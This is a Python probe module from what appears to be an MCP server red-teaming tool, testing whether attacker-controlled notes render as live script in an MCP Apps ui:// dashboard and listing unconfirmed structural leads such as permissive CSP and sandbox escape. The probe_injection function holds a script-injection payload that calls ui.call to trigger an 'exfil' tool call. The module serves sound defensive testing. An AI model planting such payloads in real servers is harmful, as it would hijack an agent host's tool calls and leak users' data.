"""T10.7 / SAM1-21 — MCP Apps UI injection probe (oracle-gated) + structural LEADs.

CONFIRMED (deterministic): attacker-controlled data rendered into the server's ui:// HTML escapes into
an EXECUTABLE position (a live <script>, an on* handler, or an action attribute). The host sandbox
blocks parent-DOM/cookies but NOT the app's own ui/* tool-calling, so a live injected node can drive
attacker tool-calls / exfil. Oracle = an INDEPENDENT HTMLParser structural check (NOT the host's
html.escape); fires iff the canary node is in an executable position.

LEADs (structural, UNCONFIRMED, never counted as confirmed): clickjacking/UI-redress, permissive
_meta.ui.csp, over-broad _meta.ui.permissions, postMessage/sandbox-escape. No deterministic sink ->
reported as observations only. Honest framing: injection = injection-class (not a cited MUST, the apps
extension gives no hard escaping MUST); leads = structural.
"""
from __future__ import annotations

from html.parser import HTMLParser

from mcp_rt.mcp_client import StatelessHTTPClient


def canary(tok: str) -> str:
    return f"UIEXEC-{tok}"


# ---- the oracle: is the canary in an EXECUTABLE position? (independent of any escaper) ----
class _ExecFinder(HTMLParser):
    def __init__(self, needle: str):
        super().__init__()
        self.needle = needle
        self._in_script = False
        self.executable = False

    def handle_starttag(self, tag, attrs):
        if tag in ("script",):
            self._in_script = True
        for k, v in attrs:
            # canary inside an event handler / action / src attribute = live
            if v and self.needle in v and (k.startswith("on") or k in ("src", "href", "data-ui-action")):
                self.executable = True

    def handle_endtag(self, tag):
        if tag == "script":
            self._in_script = False

    def handle_data(self, data):
        if self._in_script and self.needle in data:   # canary as live script text
            self.executable = True


def node_is_executable(markup: str, needle: str) -> bool:
    f = _ExecFinder(needle)
    f.feed(markup)
    return f.executable


# ---- probe ----
def _call(url, method, params):
    return StatelessHTTPClient(url).begin(method, params)


def probe_injection(url: str, tok: str) -> dict:
    payload = f"<script>ui.call('tools/call','exfil','{canary(tok)}')</script>"   # attacker-controlled note
    _call(url, "tools/call", {"name": "set_note", "arguments": {"note": payload}})
    rendered = (((_call(url, "resources/read", {"uri": "ui://dashboard"})).get("contents") or [{}])[0]).get("text", "")
    fired = node_is_executable(rendered, canary(tok))
    return {"case": "ui_markup_injection", "confirmed": True, "fired": fired, "evidence": rendered[:160]}


def probe_benign(url: str, tok: str) -> dict:
    _call(url, "tools/call", {"name": "set_note", "arguments": {"note": "Q3 revenue up 4%"}})   # ordinary content
    rendered = (((_call(url, "resources/read", {"uri": "ui://dashboard"})).get("contents") or [{}])[0]).get("text", "")
    return {"case": "benign", "confirmed": True, "fired": node_is_executable(rendered, canary(tok)),
            "renders": "Q3 revenue" in rendered}


def structural_leads(url: str) -> list[dict]:
    """UNCONFIRMED structural observations — never a confirmed finding (no deterministic sink)."""
    tools = (_call(url, "tools/list", {}).get("tools") or [])
    ui = ((tools[0] if tools else {}).get("_meta") or {}).get("ui") or {}
    leads = [
        {"kind": "clickjacking/ui-redress", "confirmed": False,
         "note": "UI could be visually overlaid to trick a click; needs human deception, no deterministic sink"},
        {"kind": "postMessage/sandbox-escape", "confirmed": False,
         "note": "host-behavior dependent; cannot be proven against a server fixture"},
    ]
    if ui.get("csp") in ("*", "", None):
        leads.append({"kind": "permissive-csp", "confirmed": False, "note": f"_meta.ui.csp={ui.get('csp')!r} allows broad origins"})
    if ui.get("permissions"):
        leads.append({"kind": "over-broad-permissions", "confirmed": False,
                      "note": f"_meta.ui.permissions={ui.get('permissions')} requested"})
    return leads
